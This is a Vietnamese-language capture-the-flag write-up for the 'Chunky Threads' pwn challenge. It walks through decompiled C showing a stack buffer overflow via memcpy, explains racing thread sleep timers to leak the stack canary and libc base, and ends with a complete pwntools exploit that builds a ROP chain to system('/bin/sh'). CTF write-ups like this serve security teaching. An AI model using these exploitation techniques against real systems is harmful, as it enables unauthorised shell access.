### Chunky Threads:
<img width="853" height="667" alt="image" src="https://github.com/user-attachments/assets/e6cd4007-77ac-4996-a58d-620f5d5a92d3" />

## Reversed:
Bài này cho mình nhập vào 0x400 byte để tạo tối đa 10 thread và lệnh thực thi trong các thread dó. \
```c
curthread = threads;
printf("%s", title);
while ( 1 )
  {
    size = read(0, buf, 1023uLL);
    if ( size == -1 )
      break;
    parsecmd(buf, size);
  }
for ( i = 0; i <= 9; ++i )
  {
    if ( threads[i] )
    pthread_join(threads[i], 0LL);
  }
return 0;
```
Hàm parsecmd(): \
```c
if ( !strncmp(str, "CHUNKS ", 7uLL) )
  {
    nthread = strtoul(str + 7, 0LL, 10);
    if ( nthread > 10u )
      errx(-1, "bad number of threads");
    printf("set nthread to %u\n", nthread);
  }
  else if ( !strncmp(str, "CHUNK ", 5uLL) )
  {
    if ( nthread )
    {
      pa.seconds = strtoul(str + 6, endptr, 10);
      pa.times = strtoul(endptr[0] + 1, endptr, 10);
      pa.source = (endptr[0] + 1);
      pa.size = size - (endptr[0] + 1 - str);
      pthread = curthread;
      curthread += 8LL;
      pthread_create(pthread, 0LL, print, &pa);
      --nthread;
    }
    else
    {
      puts("no threads remaining");
    }
  }
```
Ở đây có 2 option chính cho người sử dụng: \
+ Tạo số thread: Nhập vào số lượng thread. \
+ Thực thi thread: Các thread sẽ thực hiện hàm print() người sử dụng cần nhập thời gian và số lần thưc hiện trong hàm print().
```c
 memset(dest, 0, 64);
  times = a1->times;
  seconds = a1->seconds;
  memcpy(dest, a1->source, a1->size);
  while ( times-- )
  {
    puts(dest);
    sleep(seconds);
  }
```
## Exploit:
Ở đây có thể thấy buffer overflow chương trình cho read() vào 0x400 byte rồi memcpy() vào dest[72].\
Ta có thể ghi dữ liệu vào các thread tới các địa chỉ cần leak để hàm puts() in ra dữ liệu cần leak.\
Vấn đề xuất hiện ở đây là khi leak canary ta phải viết đề lên NULL byte của canary vì hàm puts sẽ dừng in dữ liệu khi xuất hiện NULL byte trong string.
Nhưng vì khi đè NULL byte sẽ thay đổi canary dẫn đến chương trình sẽ crash.
Ta biết trong chương trình các thread ở đây hoạt động song song nhau và ta control được thời gian sleep() của từng thread lợi dụng điều đó để leak canary và leak libc rồi ROP trước khi chương trình crash\
## Full script:
```python
#!/usr/bin/env python3

from pwn import *

context.binary = e = ELF("./chall", checksec=False)
context.log_level = 'debug'
libc = ELF("./libc.so.6", checksec=False)
gs = '''
b*0x401638
b*0x4013CF
b*0x401266
'''
def init():
    if args.LOCAL:
        p = process(["/lib64/ld-linux-x86-64.so.2", "./chall"])
        gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])

    return p

p = init()

payload = flat(
    b"CHUNKS 3",
)
p.send(payload)

# leak libc:
payload = flat(
    b"CHUNK 1000 1 ",
    b"A"*0x58,
)
p.sendafter(b"3\n", payload)
p.recvuntil(b"A"*0x58)
leak_libc = u64(p.recvline()[:-1].ljust(8, b"\00"))
libc_base = leak_libc - 0x9caa4
libc.address = libc_base
log.info(f"leak libc: {hex(libc_base)}")
# leak canary: 
payload = flat(
    b"CHUNK 1000 1 ",
    b"A"*0x49,
)
p.send(payload)
p.recvuntil(b"A"*0x49)
canary = u64(p.recv(7).rjust(8, b"\00"))
log.info(f"leak canary: {hex(canary)}")
# ROP
pop_rdi = libc_base + 0x000000000010f75b
pop_rsi = libc_base + 0x0000000000110a4d
pop_rdx_rbx_r12_r13_rbp = libc_base + 0x00000000000b503c
pop_rdi_rbp = libc_base + 0x000000000002a873
payload = flat(
    b"CHUNK 1 1 ",
    b"A"*0x48,
    p64(canary),
    b"B"*8,
    p64(pop_rdi_rbp),
    p64(next(libc.search(b"/bin/sh"))),
    p64(0),
    p64(pop_rsi),
    p64(0),
    p64(pop_rdx_rbx_r12_r13_rbp),
    p64(0)*5,
    libc.sym.system,
)
p.send(payload)
    
p.interactive()

```


